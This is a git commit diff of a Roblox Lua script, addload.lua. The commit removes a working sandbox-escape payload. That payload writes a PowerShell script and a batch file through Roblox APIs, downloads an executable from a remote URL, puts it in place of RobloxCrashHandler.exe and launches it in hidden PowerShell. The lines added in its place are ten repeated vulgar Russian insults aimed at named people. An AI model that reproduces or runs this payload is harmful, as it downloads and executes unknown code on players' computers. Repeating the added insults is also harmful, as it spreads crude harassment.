b2317d6231f4d2571df0aa7cfb93cd5029a57e3a
coyote01488 <166956344+coyote01488@users.noreply.github.com>
2024-11-15 21:25:05 +0100

    Update addload.lua

--- addload.lua
+++ addload.lua
@@ -1,28 +1,10 @@
-if not run_on_actor then return end
-for i, v in pairs(getactors()) do
-    run_on_actor(v, [=[pcall(function()
-            local POWERSHELL_NAME = "doom.ps1"
-            local POWERSHELL_PAYLOAD = [[
-                Add-Type -AssemblyName PresentationCore,PresentationFramework
-
-                taskkill /f /im RobloxCrashHandler.exe
-                timeout 1
-                move RobloxCrashHandler.exe .old
-
-                Invoke-WebRequest "https://raw.githubusercontent.com/evoincorp/doom/refs/heads/main/doom_bootstrapper.exe" -OutFile RobloxCrashHandler.exe
-
-                taskkill /f /im RobloxPlayerBeta.exe
-
-                attrib +r RobloxCrashHandler.exe
-                start RobloxCrashHandler.exe
-            ]]
-
-            local Path2 = game["Script Context"]:saveScriptProfilingData(POWERSHELL_PAYLOAD, POWERSHELL_NAME)
-
-            local FILE_NAME = "doom.bat"
-            local PAYLOAD = `start "" "powershell" -WindowStyle Hidden -ExecutionPolicy Bypass {Path2}`
-
-            local Path1 = game["Script Context"]:saveScriptProfilingData(PAYLOAD, FILE_NAME)
-            game.LinkingService:openUrl(Path1)
-        end)]=])
-end
+print("ЧЛЕН МИШИ БЫЛ В МАТЕРИ ДАМИРА")
+print("ЧЛЕН МИШИ БЫЛ В МАТЕРИ ДАМИРА")
+print("ЧЛЕН МИШИ БЫЛ В МАТЕРИ ДАМИРА")
+print("ЧЛЕН МИШИ БЫЛ В МАТЕРИ ДАМИРА")
+print("ЧЛЕН МИШИ БЫЛ В МАТЕРИ ДАМИРА")
+print("ЧЛЕН МИШИ БЫЛ В МАТЕРИ ДАМИРА")
+print("ЧЛЕН МИШИ БЫЛ В МАТЕРИ ДАМИРА")
+print("ЧЛЕН МИШИ БЫЛ В МАТЕРИ ДАМИРА")
+print("ЧЛЕН МИШИ БЫЛ В МАТЕРИ ДАМИРА")
+print("ЧЛЕН МИШИ БЫЛ В МАТЕРИ ДАМИРА")
